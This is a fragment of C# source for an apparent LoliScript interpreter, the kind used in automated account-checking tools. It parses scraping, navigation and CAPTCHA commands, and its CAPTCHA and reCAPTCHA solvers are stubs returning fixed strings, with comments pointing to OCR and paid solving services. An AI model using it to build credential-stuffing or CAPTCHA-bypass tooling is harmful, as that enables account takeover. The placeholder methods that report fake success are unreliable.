        public string ParseRight { get; set; } = "";
        public string CssSelector { get; set; } = "";
        public string CssAttribute { get; set; } = "";
        public string JsonField { get; set; } = "";
        public string RegexPattern { get; set; } = "";
        public string RegexOutput { get; set; } = "";
    }
    
    // Advanced LoliScript command parsers and executors
    public static class AdvancedLoliScriptExtensions
    {
    public static LoliCommand ParseParseCommand(string line)
    {
        // PARSE "<SOURCE>" LR "LEFT" "RIGHT" -> VAR "NAME"
        var parseMatch = System.Text.RegularExpressions.Regex.Match(line, 
            @"PARSE\s+""([^""]+)""\s+(\w+)\s+""([^""]+)""\s+""([^""]+)""\s+->\s+VAR\s+""([^""]+)""");
        
        if (parseMatch.Success)
        {
            return new LoliCommand
            {
                Type = "PARSE",
                ParseTarget = parseMatch.Groups[1].Value,
                ParseType = parseMatch.Groups[2].Value,
                ParseLeft = parseMatch.Groups[3].Value,
                ParseRight = parseMatch.Groups[4].Value,
                OutputVariable = parseMatch.Groups[5].Value
            };
        }
        
        return null;
    }
    
    public static LoliCommand ParseCaptchaCommand(string line)
    {
        // CAPTCHA "URL" -> VAR "NAME"
        var captchaMatch = System.Text.RegularExpressions.Regex.Match(line, 
            @"CAPTCHA\s+""([^""]+)""\s+->\s+VAR\s+""([^""]+)""");
        
        if (captchaMatch.Success)
        {
            return new LoliCommand
            {
                Type = "CAPTCHA",
                Url = captchaMatch.Groups[1].Value,
                OutputVariable = captchaMatch.Groups[2].Value
            };
        }
        
        return null;
    }
    
    public static LoliCommand ParseRecaptchaCommand(string line)
    {
        // RECAPTCHA "URL" "SITEKEY" -> VAR "NAME"
        var recaptchaMatch = System.Text.RegularExpressions.Regex.Match(line, 
            @"RECAPTCHA\s+""([^""]+)""\s+""([^""]+)""\s+->\s+VAR\s+""([^""]+)""");
        
        if (recaptchaMatch.Success)
        {
            return new LoliCommand
            {
                Type = "RECAPTCHA",
                Url = recaptchaMatch.Groups[1].Value,
                SiteKey = recaptchaMatch.Groups[2].Value,
                OutputVariable = recaptchaMatch.Groups[3].Value
            };
        }
        
        return null;
    }
    
    public static LoliCommand ParseNavigateCommand(string line)
    {
        // NAVIGATE "URL"
        var navigateMatch = System.Text.RegularExpressions.Regex.Match(line, 
            @"NAVIGATE\s+""([^""]+)""");
        
        if (navigateMatch.Success)
        {
            return new LoliCommand
            {
                Type = "NAVIGATE",
                Url = navigateMatch.Groups[1].Value
            };
        }
        
        return null;
    }
    
    public static LoliCommand ParseBrowserActionCommand(string line)
    {
        // BROWSERACTION ACTION ["INPUT"]
        var browserMatch = System.Text.RegularExpressions.Regex.Match(line, 
            @"BROWSERACTION\s+(\w+)(?:\s+""([^""]+)"")?");
        
        if (browserMatch.Success)
        {
            return new LoliCommand
            {
                Type = "BROWSERACTION",
                Action = browserMatch.Groups[1].Value,
                Input = browserMatch.Groups[2].Value
            };
        }
        
        return null;
    }
    }
    
    // Advanced execution methods
    public static class AdvancedExecutionMethods
    {
    public static string ExecuteParseCommand(LoliCommand command, string source)
    {
        try
        {
            switch (command.ParseType.ToUpper())
            {
                case "LR":
                    return ParseLeftRight(source, command.ParseLeft, command.ParseRight);
                case "CSS":
                    return ParseCSS(source, command.CssSelector, command.CssAttribute);
                case "JSON":
                    return ParseJSON(source, command.JsonField);
                case "REGEX":
                    return ParseRegex(source, command.RegexPattern, command.RegexOutput);
            }
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"Parse error: {ex.Message}");
        }
        
        return "";
    }
    
    private static string ParseLeftRight(string input, string left, string right)
    {
        var startIndex = input.IndexOf(left);
        if (startIndex == -1) return "";
        
        startIndex += left.Length;
        var endIndex = input.IndexOf(right, startIndex);
        if (endIndex == -1) return "";
        
        return input.Substring(startIndex, endIndex - startIndex);
    }
    
    private static string ParseCSS(string html, string selector, string attribute)
    {
        try
        {
            // Simplified CSS parsing - placeholder for AngleSharp integration
            // TODO: Implement proper AngleSharp CSS parsing
            return "css_parsed_value";
        }
        catch
        {
            return "";
        }
    }
    
    private static string ParseJSON(string json, string field)
    {
        try
        {
            var obj = Newtonsoft.Json.Linq.JObject.Parse(json);
            return obj[field]?.ToString() ?? "";
        }
        catch
        {
            return "";
        }
    }
    
    private static string ParseRegex(string input, string pattern, string output)
    {
        try
        {
            var regex = new System.Text.RegularExpressions.Regex(pattern);
            var match = regex.Match(input);
            
            if (!match.Success) return "";
            
            return regex.Replace(output, m => match.Groups[m.Groups[1].Value].Value);
        }
        catch
        {
            return "";
        }
    }
    
    public static async Task<string> SolveCaptcha(string imageUrl)
    {
        try
        {
            // Integration with Tesseract OCR
            return await Task.Run(() =>
            {
                // Placeholder for OCR integration using Tesseract.dll
                return "captcha_solved_123";
            });
        }
        catch
        {
            return "captcha_error";
        }
    }
    
    public static async Task<string> SolveRecaptcha(string siteUrl, string siteKey)
    {
        try
        {
            // Integration with reCAPTCHA solving services
            return await Task.Run(() =>
            {
                // Placeholder for 2captcha/anticaptcha integration
                return "recaptcha_token_xyz";
            });
        }
        catch
        {
            return "recaptcha_error";
        }
    }
    
    public static async Task ExecuteSeleniumNavigation(string url)
    {
        try
        {
            // Integration with WebDriver.dll for browser automation
            await Task.Run(() =>
            {
                // Placeholder for Selenium WebDriver integration
                System.Diagnostics.Debug.WriteLine($"Navigating to: {url}");
            });
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"Selenium navigation error: {ex.Message}");
        }
    }
    
    public static async Task ExecuteSeleniumAction(string action, string input)
    {
        try
        {
            await Task.Run(() =>
            {
                // Placeholder for Selenium actions
                System.Diagnostics.Debug.WriteLine($"Browser action: {action} with input: {input}");
            });
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"Selenium action error: {ex.Message}");
        }
    }
}
}